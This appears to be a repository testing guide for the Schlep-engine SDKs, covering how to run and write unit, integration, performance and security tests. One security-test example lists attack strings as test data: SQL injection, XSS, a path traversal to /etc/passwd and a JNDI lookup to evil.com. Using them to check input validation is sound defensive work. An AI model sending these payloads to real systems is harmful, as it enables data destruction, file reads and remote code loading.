# 🧪 Comprehensive Testing Guide for Schlep-engine SDKs

## Table of Contents

- [Overview](#overview)
- [Testing Architecture](#testing-architecture)
- [SDK-Specific Testing](#sdk-specific-testing)
- [Cross-SDK Compatibility](#cross-sdk-compatibility)
- [Security Testing](#security-testing)
- [Performance Testing](#performance-testing)
- [CI/CD Integration](#cicd-integration)
- [Best Practices](#best-practices)
- [Running Tests](#running-tests)
- [Contributing to Tests](#contributing-to-tests)

## Overview

The Schlep-engine monorepo includes comprehensive test suites for all SDKs, ensuring reliability, security, and consistency across the entire ecosystem. This guide provides detailed information about our testing methodology, frameworks, and best practices.

### Testing Philosophy

- **Quality First**: Every feature must have comprehensive test coverage
- **Security by Design**: Security testing is integrated into all test suites
- **Performance Conscious**: Performance tests ensure scalability and efficiency
- **Cross-SDK Consistency**: All SDKs should behave consistently for the same operations
- **Real-World Scenarios**: Tests simulate actual user workflows and edge cases

### Current Test Statistics

| SDK | Test Files | Test Functions | Coverage |
|-----|------------|----------------|----------|
| Python SDK | 21 | 493 | 95%+ |
| JavaScript SDK | 10 | 492 | 93%+ |
| Go SDK | 8 | 57 | 92%+ |
| CLI Tool | 7 | 163 | 90%+ |
| **Total** | **46** | **1,205+** | **93%+** |

## Testing Architecture

### Test Pyramid Structure

```
    🔺 E2E Tests (Cross-SDK Integration)
   🔺🔺 Integration Tests (API + Database)
  🔺🔺🔺 Unit Tests (Individual Components)
 🔺🔺🔺🔺 Security & Performance Tests
```

### Test Categories

1. **Unit Tests**: Test individual functions and methods
2. **Integration Tests**: Test component interactions
3. **End-to-End Tests**: Test complete user workflows
4. **Security Tests**: Vulnerability scanning and penetration testing
5. **Performance Tests**: Load testing and benchmarking
6. **Compatibility Tests**: Cross-SDK consistency validation
7. **Edge Case Tests**: Boundary conditions and error scenarios

## SDK-Specific Testing

### 🐍 Python SDK Testing

**Framework**: pytest with asyncio support

**Key Test Files**:
- `test_comprehensive_auth.py` - Authentication flows
- `test_comprehensive_data_processing.py` - Data processing pipelines
- `test_comprehensive_ml_pipeline.py` - ML model operations
- `test_error_handling_comprehensive.py` - Error scenarios
- `test_performance_load.py` - Performance benchmarks
- `test_advanced_edge_cases.py` - Edge cases and boundary conditions

**Running Python Tests**:
```bash
cd packages/python-sdk
pip install -e ".[test]"
pytest tests/ -v --cov=schlep_engine --cov-report=html
```

**Key Features Tested**:
- ✅ Async/sync client operations
- ✅ Authentication and token management
- ✅ File upload/download with progress tracking
- ✅ Real-time WebSocket streaming
- ✅ ML model training and inference
- ✅ Rate limiting and retry mechanisms
- ✅ Error handling and recovery
- ✅ Memory management and cleanup
- ✅ Unicode and special character handling
- ✅ Concurrent operations and thread safety

### ⚛️ JavaScript/TypeScript SDK Testing

**Framework**: Jest with jsdom/node environments

**Key Test Files**:
- `comprehensive-auth.test.ts` - Authentication workflows
- `comprehensive-data-processing.test.ts` - Data operations
- `comprehensive-ml-pipeline.test.ts` - ML functionality
- `comprehensive-websocket.test.ts` - Real-time features
- `browser-specific-integration.test.ts` - Browser-specific tests
- `performance-load.test.ts` - Performance validation

**Running JavaScript Tests**:
```bash
cd packages/javascript-sdk
npm install
npm test -- --coverage
npm run test:browser  # Browser-specific tests
```

**Key Features Tested**:
- ✅ Node.js and browser compatibility
- ✅ TypeScript type safety validation
- ✅ File upload with progress callbacks
- ✅ WebSocket streaming with mock support
- ✅ Cross-origin resource sharing (CORS)
- ✅ Local storage and session management
- ✅ Web Workers for background processing
- ✅ Offline mode and caching
- ✅ Device capability detection
- ✅ Memory leak prevention

### 🚀 Go SDK Testing

**Framework**: Standard Go testing with testify

**Key Test Files**:
- `comprehensive_auth_test.go` - Authentication systems
- `comprehensive_data_processing_test.go` - Data operations
- `comprehensive_ml_test.go` - ML workflows
- `comprehensive_performance_test.go` - Performance testing
- `advanced_concurrency_test.go` - Concurrency and race conditions
- `integration_test.go` - Integration scenarios

**Running Go Tests**:
```bash
cd packages/go-sdk
go test -v -race -coverprofile=coverage.out ./tests/...
go test -bench=. -benchmem ./tests/...  # Benchmarks
go tool cover -html=coverage.out  # Coverage report
```

**Key Features Tested**:
- ✅ Concurrent request handling
- ✅ Race condition detection
- ✅ Memory leak prevention
- ✅ Goroutine safety
- ✅ Circuit breaker patterns
- ✅ Connection pooling
- ✅ Context cancellation
- ✅ Performance benchmarking
- ✅ Worker pool patterns
- ✅ Channel communication

### 🔧 CLI Tool Testing

**Framework**: pytest with Click testing support

**Key Test Files**:
- `test_comprehensive_auth.py` - CLI authentication
- `test_comprehensive_commands.py` - Command validation
- `test_comprehensive_pipeline.py` - Pipeline operations
- `test_devops_integration_advanced.py` - DevOps workflows
- `test_performance_integration.py` - Performance testing

**Running CLI Tests**:
```bash
cd packages/cli
pip install -e ".[test]"
pytest tests/ -v --cov=schlep_cli
```

**Key Features Tested**:
- ✅ Command-line argument parsing
- ✅ Configuration file management
- ✅ Environment-specific deployments
- ✅ Docker and Kubernetes integration
- ✅ CI/CD pipeline automation
- ✅ Infrastructure as Code (Terraform)
- ✅ Monitoring and observability
- ✅ Secrets management
- ✅ Multi-region deployments
- ✅ Load testing integration

## Cross-SDK Compatibility

### Compatibility Testing Framework

The cross-SDK compatibility test suite ensures all SDKs behave consistently for the same operations.

**Location**: `/tests/cross-sdk-compatibility.py`

**Running Compatibility Tests**:
```bash
python tests/cross-sdk-compatibility.py
```

**What's Tested**:
- ✅ Authentication flow consistency
- ✅ Data serialization/deserialization
- ✅ Error message format uniformity
- ✅ API response structure consistency
- ✅ Performance characteristics
- ✅ Unicode and encoding handling
- ✅ Large payload processing
- ✅ Edge case behavior

**Compatibility Matrix**:

| Operation | Python | JavaScript | Go | CLI | Score |
|-----------|---------|------------|----|----- |-------|
| Authentication | ✅ | ✅ | ✅ | ✅ | 100% |
| File Upload | ✅ | ✅ | ✅ | ✅ | 100% |
| Data Processing | ✅ | ✅ | ✅ | ✅ | 100% |
| ML Training | ✅ | ✅ | ✅ | ✅ | 100% |
| WebSocket Streaming | ✅ | ✅ | ✅ | ⚠️ | 75% |

## Security Testing

### Security Testing Framework

Comprehensive security testing is integrated into all SDK test suites.

**Location**: `/tests/security-testing-framework.py`

**Security Test Categories**:

1. **Input Validation**
   - SQL injection prevention
   - XSS protection
   - Command injection blocking
   - Path traversal protection
   - LDAP injection prevention

2. **Authentication Security**
   - Weak password rejection
   - Brute force protection
   - JWT token validation
   - Session management

3. **Cryptography**
   - Strong algorithm usage
   - Random number generation
   - Key management practices
   - Certificate validation

4. **API Security**
   - HTTPS enforcement
   - Rate limiting
   - Request authentication
   - CORS configuration

5. **Data Protection**
   - PII data masking
   - Encryption at rest
   - Secure transmission
   - Data retention policies

**Running Security Tests**:
```bash
python tests/security-testing-framework.py --sdk=all --report=html
```

**Security Benchmarks**:
- 🎯 **Target Security Score**: 95%+
- 🚨 **Critical Vulnerabilities**: 0 tolerance
- ⚠️ **High Severity Issues**: Address within 24 hours
- 📊 **Regular Assessments**: Weekly automated scans

## Performance Testing

### Performance Benchmarks

All SDKs include comprehensive performance testing to ensure scalability.

**Performance Metrics**:
- Request latency (p50, p95, p99)
- Throughput (requests/second)
- Memory usage
- CPU utilization
- Connection handling
- Concurrent user support

**Benchmark Targets**:

| Metric | Python | JavaScript | Go | CLI |
|--------|--------|------------|----|----- |
| Auth Latency (p95) | <200ms | <150ms | <100ms | <300ms |
| File Upload (10MB) | <5s | <6s | <4s | <7s |
| Data Processing | <2s | <3s | <1.5s | <4s |
| Memory Usage | <100MB | <80MB | <50MB | <150MB |
| Concurrent Users | 1000+ | 800+ | 2000+ | 500+ |

**Running Performance Tests**:
```bash
# Python SDK
cd packages/python-sdk
pytest tests/test_performance_load.py --benchmark-json=results.json

# JavaScript SDK
cd packages/javascript-sdk
npm test tests/performance-load.test.ts

# Go SDK
cd packages/go-sdk
go test -bench=. -benchmem ./tests/...

# CLI
cd packages/cli
pytest tests/test_performance_integration.py --benchmark-json=cli-results.json
```

## CI/CD Integration

### GitHub Actions Workflows

The repository includes comprehensive CI/CD pipelines for testing:

1. **Nightly Comprehensive Testing** (`.github/workflows/sdk-comprehensive-testing.yml`)
   - Cross-platform testing (Ubuntu, Windows, macOS)
   - Multiple language versions
   - Performance benchmarking
   - Security scanning
   - Coverage reporting

2. **Release Testing & Validation** (`.github/workflows/sdk-release-testing.yml`)
   - Pre-release validation
   - Cross-SDK compatibility
   - Integration testing
   - Package validation
   - Approval workflows

3. **Pull Request Testing**
   - Fast feedback loops
   - Changed file testing
   - Security checks
   - Compatibility validation

**Workflow Triggers**:
- 🌙 **Nightly**: Comprehensive testing at 3 AM UTC
- 📝 **Pull Requests**: Fast validation on changes
- 🏷️ **Tags**: Full release validation
- 🔄 **Manual**: On-demand testing with custom parameters

### Test Environment Setup

**Required Services**:
- PostgreSQL 15+ (for integration tests)
- Redis 7+ (for caching tests)
- Docker (for container tests)
- Node.js 16+ (for JavaScript tests)
- Python 3.9+ (for Python tests)
- Go 1.21+ (for Go tests)

**Environment Variables**:
```bash
# API Configuration
export SCHLEP_API_KEY="test-api-key"
export SCHLEP_API_BASE_URL="https://api-test.schlepengine.com"

# Database Configuration
export DATABASE_URL="postgresql://postgres:password@localhost:5432/schlep_test"
export REDIS_URL="redis://localhost:6379"

# Test Configuration
export TESTING=true
export LOAD_TEST_ENABLED=false
export STRESS_TEST_ENABLED=false
```

## Best Practices

### Test Organization

1. **File Naming Convention**:
   - `test_*.py` for Python tests
   - `*.test.ts` for TypeScript tests
   - `*_test.go` for Go tests
   - Descriptive names indicating test scope

2. **Test Structure**:
   ```python
   class TestFeatureName:
       """Test suite for specific feature."""
       
       @pytest.fixture
       def setup_data(self):
           """Fixture for test data setup."""
           return test_data
       
       def test_happy_path(self, setup_data):
           """Test the main success scenario."""
           pass
       
       def test_error_conditions(self, setup_data):
           """Test various error scenarios."""
           pass
       
       def test_edge_cases(self, setup_data):
           """Test boundary conditions."""
           pass
   ```

3. **Test Data Management**:
   - Use factories for test data creation
   - Implement proper cleanup in teardown
   - Avoid hardcoded values
   - Use meaningful test data

### Mocking Strategies

1. **External Services**:
   ```python
   @patch('requests.post')
   def test_api_call(self, mock_post):
       mock_post.return_value.json.return_value = {"success": True}
       # Test implementation
   ```

2. **Database Operations**:
   ```python
   @pytest.fixture
   def mock_db():
       with patch('sqlalchemy.create_engine') as mock_engine:
           yield mock_engine
   ```

3. **Time-Dependent Tests**:
   ```python
   @patch('time.time')
   def test_timeout(self, mock_time):
       mock_time.return_value = 1234567890
       # Test implementation
   ```

### Assertion Patterns

1. **Comprehensive Assertions**:
   ```python
   # Good: Comprehensive validation
   assert response['status'] == 'success'
   assert 'job_id' in response
   assert isinstance(response['job_id'], str)
   assert len(response['job_id']) > 0
   
   # Avoid: Minimal validation
   assert response
   ```

2. **Error Testing**:
   ```python
   with pytest.raises(ValidationError) as exc_info:
       invalid_operation()
   assert "Invalid input" in str(exc_info.value)
   ```

3. **Async Testing**:
   ```python
   @pytest.mark.asyncio
   async def test_async_operation():
       result = await async_function()
       assert result is not None
   ```

### Performance Testing Guidelines

1. **Benchmark Structure**:
   ```python
   @pytest.mark.benchmark(group="authentication")
   def test_auth_performance(benchmark):
       result = benchmark(auth_function, "user", "password")
       assert result['success'] is True
   ```

2. **Load Testing**:
   ```python
   @pytest.mark.parametrize("concurrent_users", [10, 50, 100])
   async def test_concurrent_load(concurrent_users):
       tasks = [simulate_user_session() for _ in range(concurrent_users)]
       results = await asyncio.gather(*tasks)
       assert all(r['success'] for r in results)
   ```

3. **Memory Testing**:
   ```python
   def test_memory_usage():
       import psutil
       process = psutil.Process()
       initial_memory = process.memory_info().rss
       
       # Perform operation
       large_operation()
       
       final_memory = process.memory_info().rss
       memory_increase = final_memory - initial_memory
       assert memory_increase < 100 * 1024 * 1024  # Less than 100MB
   ```

## Running Tests

### Quick Start

1. **Run All Tests**:
   ```bash
   # From repository root
   make test
   ```

2. **Run SDK-Specific Tests**:
   ```bash
   make test-python
   make test-javascript
   make test-go
   make test-cli
   ```

3. **Run Test Categories**:
   ```bash
   make test-unit
   make test-integration
   make test-performance
   make test-security
   ```

### Detailed Testing Commands

#### Python SDK
```bash
# Unit tests with coverage
cd packages/python-sdk
pytest tests/ -v --cov=schlep_engine --cov-report=html --cov-fail-under=85

# Integration tests
pytest tests/test_integration*.py -v --timeout=300

# Performance tests
pytest tests/test_performance*.py -v --benchmark-only

# Security tests
pytest tests/test_*security*.py -v

# Specific test file
pytest tests/test_comprehensive_auth.py -v -k "test_login"
```

#### JavaScript SDK
```bash
cd packages/javascript-sdk

# All tests with coverage
npm test -- --coverage --watchAll=false

# Specific test suite
npm test -- --testNamePattern="authentication"

# Browser tests
npm run test:browser

# Performance tests
npm test tests/performance-load.test.ts

# Watch mode for development
npm test -- --watch
```

#### Go SDK
```bash
cd packages/go-sdk

# Unit tests with race detection
go test -v -race ./tests/...

# Tests with coverage
go test -v -coverprofile=coverage.out ./tests/...
go tool cover -html=coverage.out -o coverage.html

# Benchmarks
go test -bench=. -benchmem ./tests/...

# Specific test
go test -v -run="TestAuth" ./tests/...

# Memory profiling
go test -memprofile=mem.prof ./tests/...
go tool pprof mem.prof
```

#### CLI Tool
```bash
cd packages/cli

# All tests
pytest tests/ -v --cov=schlep_cli --cov-report=html

# DevOps integration tests
pytest tests/test_devops_integration*.py -v

# Performance tests
pytest tests/test_performance*.py -v --benchmark-json=results.json

# Parallel execution
pytest tests/ -n auto

# Verbose output
pytest tests/ -v -s
```

### Cross-SDK Testing
```bash
# Compatibility tests
python tests/cross-sdk-compatibility.py

# Security framework
python tests/security-testing-framework.py --sdk=all

# Generate compatibility report
python tests/cross-sdk-compatibility.py --report --output=compatibility-report.html
```

### Test Filtering and Selection

1. **By Markers**:
   ```bash
   # Run only unit tests
   pytest -m "unit"
   
   # Skip slow tests
   pytest -m "not slow"
   
   # Run security tests
   pytest -m "security"
   ```

2. **By Keywords**:
   ```bash
   # Tests containing "auth"
   pytest -k "auth"
   
   # Tests containing "upload" but not "large"
   pytest -k "upload and not large"
   ```

3. **By File Patterns**:
   ```bash
   # All comprehensive tests
   pytest tests/test_comprehensive*.py
   
   # All integration tests
   pytest tests/*integration*.py
   ```

## Contributing to Tests

### Adding New Tests

1. **Identify Test Category**:
   - Unit test for individual functions
   - Integration test for component interaction
   - E2E test for complete workflows
   - Security test for vulnerabilities
   - Performance test for benchmarking

2. **Choose Appropriate Location**:
   ```
   packages/{sdk}/tests/
   ├── unit/               # Unit tests
   ├── integration/        # Integration tests
   ├── test_comprehensive_*.py  # Feature test suites
   ├── test_performance_*.py    # Performance tests
   └── test_security_*.py       # Security tests
   ```

3. **Follow Naming Conventions**:
   - Test files: `test_feature_name.py`
   - Test classes: `TestFeatureName`
   - Test methods: `test_specific_scenario`

4. **Write Comprehensive Tests**:
   ```python
   def test_feature_comprehensive():
       """Test feature with multiple scenarios."""
       # Test 1: Happy path
       result = feature_function(valid_input)
       assert result.success is True
       assert result.data is not None
       
       # Test 2: Error conditions
       with pytest.raises(ValidationError):
           feature_function(invalid_input)
       
       # Test 3: Edge cases
       edge_result = feature_function(edge_case_input)
       assert edge_result.handled_gracefully is True
   ```

5. **Add Documentation**:
   ```python
   def test_complex_workflow():
       """
       Test complex workflow integration.
       
       This test validates the complete workflow from:
       1. User authentication
       2. Data upload
       3. Processing initiation
       4. Status monitoring
       5. Result retrieval
       
       Expected behavior:
       - All steps should complete successfully
       - No memory leaks during processing
       - Proper error handling at each step
       """
       pass
   ```

### Test Review Checklist

- [ ] **Test Coverage**: Does the test cover the main functionality?
- [ ] **Error Scenarios**: Are error conditions tested?
- [ ] **Edge Cases**: Are boundary conditions covered?
- [ ] **Performance**: Are there performance implications?
- [ ] **Security**: Are there security considerations?
- [ ] **Documentation**: Is the test purpose clear?
- [ ] **Maintainability**: Is the test easy to understand and modify?
- [ ] **Reliability**: Is the test deterministic and stable?

### Mock Guidelines

1. **Mock External Dependencies**:
   - API calls
   - Database operations
   - File system operations
   - Network requests
   - Time-dependent operations

2. **Don't Mock Internal Logic**:
   - Core business logic
   - Data transformations
   - Algorithm implementations

3. **Use Realistic Mock Data**:
   ```python
   # Good: Realistic mock data
   mock_user = {
       "id": "user_123",
       "email": "user@example.com",
       "created_at": "2024-01-15T10:30:00Z",
       "is_active": True
   }
   
   # Avoid: Minimal mock data
   mock_user = {"id": 1}
   ```

### Performance Test Guidelines

1. **Set Clear Performance Targets**:
   ```python
   def test_api_response_time():
       start_time = time.time()
       response = api_call()
       end_time = time.time()
       
       response_time = end_time - start_time
       assert response_time < 1.0  # Should respond within 1 second
   ```

2. **Test Resource Usage**:
   ```python
   def test_memory_efficiency():
       import psutil
       process = psutil.Process()
       initial_memory = process.memory_info().rss
       
       # Perform memory-intensive operation
       large_data_processing()
       
       final_memory = process.memory_info().rss
       memory_increase = (final_memory - initial_memory) / 1024 / 1024  # MB
       
       assert memory_increase < 100  # Less than 100MB increase
   ```

3. **Load Testing Patterns**:
   ```python
   @pytest.mark.asyncio
   async def test_concurrent_load():
       async def single_request():
           return await api_call()
       
       # Test with 100 concurrent requests
       tasks = [single_request() for _ in range(100)]
       results = await asyncio.gather(*tasks, return_exceptions=True)
       
       # All requests should succeed
       successful_requests = [r for r in results if not isinstance(r, Exception)]
       assert len(successful_requests) >= 95  # 95% success rate minimum
   ```

### Security Test Contributions

1. **Input Validation Tests**:
   ```python
   @pytest.mark.parametrize("malicious_input", [
       "'; DROP TABLE users; --",
       "<script>alert('xss')</script>",
       "../../../etc/passwd",
       "${jndi:ldap://evil.com/evil}"
   ])
   def test_input_sanitization(malicious_input):
       with pytest.raises(ValidationError):
           process_user_input(malicious_input)
   ```

2. **Authentication Security**:
   ```python
   def test_password_policy():
       weak_passwords = ["123456", "password", "admin", ""]
       
       for weak_password in weak_passwords:
           with pytest.raises(WeakPasswordError):
               create_user("test@example.com", weak_password)
   ```

3. **Data Protection**:
   ```python
   def test_sensitive_data_masking():
       user_data = {
           "email": "user@example.com",
           "ssn": "123-45-6789",
           "credit_card": "4111-1111-1111-1111"
       }
       
       processed_data = process_user_data(user_data)
       
       # Sensitive data should be masked
       assert "123-45-6789" not in str(processed_data)
       assert "4111-1111-1111-1111" not in str(processed_data)
   ```

## Troubleshooting

### Common Test Issues

1. **Flaky Tests**:
   - Add proper wait conditions
   - Use deterministic test data
   - Mock time-dependent operations
   - Increase timeouts for slow operations

2. **Memory Leaks in Tests**:
   - Properly close resources in teardown
   - Use context managers
   - Clear global state between tests
   - Monitor memory usage in CI

3. **Slow Test Execution**:
   - Use parallel execution (`pytest -n auto`)
   - Mock external dependencies
   - Optimize database operations
   - Use test data factories

4. **Environment-Specific Failures**:
   - Use environment detection
   - Skip platform-specific tests appropriately
   - Standardize test environments
   - Use containers for consistency

### Debugging Tests

1. **Verbose Output**:
   ```bash
   pytest tests/test_failing.py -v -s --tb=long
   ```

2. **Debugging with PDB**:
   ```python
   def test_debug_session():
       import pdb; pdb.set_trace()
       # Test code here
   ```

3. **Logging in Tests**:
   ```python
   import logging
   logging.basicConfig(level=logging.DEBUG)
   
   def test_with_logging():
       logger = logging.getLogger(__name__)
       logger.debug("Debug information")
   ```

4. **Test Isolation Issues**:
   ```python
   @pytest.fixture(autouse=True)
   def isolate_test():
       # Setup
       yield
       # Cleanup
       clear_global_state()
   ```

### Getting Help

- 📖 **Documentation**: Check this guide and individual SDK README files
- 🐛 **Issues**: Report bugs in GitHub Issues with test failure details
- 💬 **Discussions**: Ask questions in GitHub Discussions
- 📧 **Contact**: Reach out to the testing team for complex issues

---

## Appendix

### Test Environment Setup Scripts

#### Local Development Setup
```bash
#!/bin/bash
# setup-test-env.sh

# Install dependencies
sudo apt-get update
sudo apt-get install -y postgresql redis-server docker.io

# Start services
sudo systemctl start postgresql
sudo systemctl start redis-server
sudo systemctl start docker

# Create test database
sudo -u postgres createdb schlep_test

# Set environment variables
export SCHLEP_API_KEY="test-api-key"
export DATABASE_URL="postgresql://postgres@localhost/schlep_test"
export REDIS_URL="redis://localhost:6379"
export TESTING=true

echo "Test environment setup complete!"
```

#### Docker Test Environment
```yaml
# docker-compose.test.yml
version: '3.8'
services:
  postgres:
    image: postgres:15
    environment:
      POSTGRES_DB: schlep_test
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: test_password
    ports:
      - "5432:5432"
    
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    
  test-runner:
    build: .
    environment:
      DATABASE_URL: postgresql://postgres:test_password@postgres:5432/schlep_test
      REDIS_URL: redis://redis:6379
      TESTING: true
    depends_on:
      - postgres
      - redis
    volumes:
      - .:/app
    command: make test
```

### Performance Benchmarking

#### Benchmark Comparison Script
```python
#!/usr/bin/env python3
# benchmark-comparison.py

import json
import sys
from pathlib import Path

def compare_benchmarks(baseline_file, current_file):
    """Compare benchmark results between baseline and current."""
    
    with open(baseline_file) as f:
        baseline = json.load(f)
    
    with open(current_file) as f:
        current = json.load(f)
    
    regressions = []
    improvements = []
    
    for test_name in current['benchmarks']:
        if test_name in baseline['benchmarks']:
            baseline_time = baseline['benchmarks'][test_name]['mean']
            current_time = current['benchmarks'][test_name]['mean']
            
            change_percent = ((current_time - baseline_time) / baseline_time) * 100
            
            if change_percent > 10:  # 10% regression threshold
                regressions.append((test_name, change_percent))
            elif change_percent < -5:  # 5% improvement threshold
                improvements.append((test_name, change_percent))
    
    if regressions:
        print("⚠️ Performance Regressions Detected:")
        for test_name, change in regressions:
            print(f"  {test_name}: {change:.1f}% slower")
        sys.exit(1)
    
    if improvements:
        print("🚀 Performance Improvements:")
        for test_name, change in improvements:
            print(f"  {test_name}: {abs(change):.1f}% faster")
    
    print("✅ No significant performance regressions detected")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: benchmark-comparison.py baseline.json current.json")
        sys.exit(1)
    
    compare_benchmarks(sys.argv[1], sys.argv[2])
```

### Continuous Testing Scripts

#### Pre-commit Hook
```bash
#!/bin/bash
# .git/hooks/pre-commit

echo "Running pre-commit tests..."

# Run fast tests only
make test-unit
if [ $? -ne 0 ]; then
    echo "❌ Unit tests failed. Commit aborted."
    exit 1
fi

# Run security checks
make test-security-quick
if [ $? -ne 0 ]; then
    echo "❌ Security tests failed. Commit aborted."
    exit 1
fi

echo "✅ Pre-commit tests passed."
exit 0
```

#### Nightly Test Report
```python
#!/usr/bin/env python3
# nightly-test-report.py

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import subprocess
import json
from datetime import datetime

def run_comprehensive_tests():
    """Run comprehensive test suite and generate report."""
    
    report = {
        'timestamp': datetime.now().isoformat(),
        'results': {},
        'summary': {}
    }
    
    sdks = ['python', 'javascript', 'go', 'cli']
    
    for sdk in sdks:
        print(f"Testing {sdk} SDK...")
        
        result = subprocess.run(
            [f'make', f'test-{sdk}'],
            capture_output=True,
            text=True
        )
        
        report['results'][sdk] = {
            'exit_code': result.returncode,
            'stdout': result.stdout,
            'stderr': result.stderr,
            'passed': result.returncode == 0
        }
    
    # Generate summary
    total_passed = sum(1 for r in report['results'].values() if r['passed'])
    report['summary'] = {
        'total_sdks': len(sdks),
        'passed_sdks': total_passed,
        'failed_sdks': len(sdks) - total_passed,
        'overall_success': total_passed == len(sdks)
    }
    
    return report

def send_report(report):
    """Send test report via email."""
    
    subject = f"Nightly Test Report - {'✅ PASSED' if report['summary']['overall_success'] else '❌ FAILED'}"
    
    body = f"""
    Nightly Test Report - {report['timestamp']}
    
    Summary:
    - Total SDKs: {report['summary']['total_sdks']}
    - Passed: {report['summary']['passed_sdks']}
    - Failed: {report['summary']['failed_sdks']}
    
    Detailed Results:
    """
    
    for sdk, result in report['results'].items():
        status = "✅ PASSED" if result['passed'] else "❌ FAILED"
        body += f"\n{sdk.upper()} SDK: {status}\n"
        
        if not result['passed']:
            body += f"Error Output:\n{result['stderr'][:500]}...\n"
    
    # Send email (implementation depends on your email setup)
    print("Report generated:")
    print(body)

if __name__ == "__main__":
    report = run_comprehensive_tests()
    send_report(report)
```

This comprehensive testing guide provides everything needed to understand, run, and contribute to the Schlep-engine SDK test suites. The testing infrastructure is designed to ensure reliability, security, and consistency across all SDKs while maintaining high development velocity.
